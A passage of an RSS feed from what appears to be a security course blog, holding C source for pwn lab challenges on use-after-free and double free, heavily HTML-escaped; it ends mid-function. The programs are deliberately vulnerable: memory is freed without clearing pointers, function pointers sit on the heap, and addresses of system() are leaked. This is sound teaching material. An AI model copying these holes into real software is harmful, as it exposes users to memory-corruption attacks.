&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;gift1: %p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>system);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;gift2: %p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, ptr);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			register_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			set_name();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			trigger_event();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x39(Lab - Double Free)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/</guid><description>&lt;h1 id="simple-pwn-0x39lab---double-free">
 Simple PWN 0x39(Lab - Double Free)
 &lt;a class="anchor" href="#simple-pwn-0x39lab---double-free">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rkD83kaji">0x18(Lab - &lt;code>babynote&lt;/code>)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">note&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>content;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">note&lt;/span> notes[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">read_ul&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> strtoul(buf, NULL, &lt;span style="color:#ae81ff">10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">add_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[idx].len &lt;span style="color:#f92672">=&lt;/span> read_ul();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[idx].content &lt;span style="color:#f92672">=&lt;/span> malloc(notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Add done&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Note[%d]:&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, idx);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	write(&lt;span style="color:#ae81ff">1&lt;/span>, notes[idx].content, notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, notes[idx].content, notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	free(notes[idx].content);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Delete done&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. add note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. read note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. write note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;4. delete note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./flag.txt&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[&lt;span style="color:#ae81ff">0&lt;/span>].len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[&lt;span style="color:#ae81ff">0&lt;/span>].content &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x30&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, notes[&lt;span style="color:#ae81ff">0&lt;/span>].content, &lt;span style="color:#ae81ff">0x30&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	close(fd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			add_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			read_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			write_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x40(2023 HW - UAF++)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/</guid><description>&lt;h1 id="simple-pwn-0x402023-hw---uaf">
 Simple PWN 0x40(2023 HW - UAF++)
 &lt;a class="anchor" href="#simple-pwn-0x402023-hw---uaf">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/SJWc9v4Bp">0x34(2023 Lab - UAF):three:&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">default_handle&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;EVENT: get event named &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>event_handle)(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span> &lt;span style="color:#f92672">*&lt;/span>entities[&lt;span style="color:#ae81ff">0x2&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x2&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. register entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. delete entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. trigger event&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">register_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
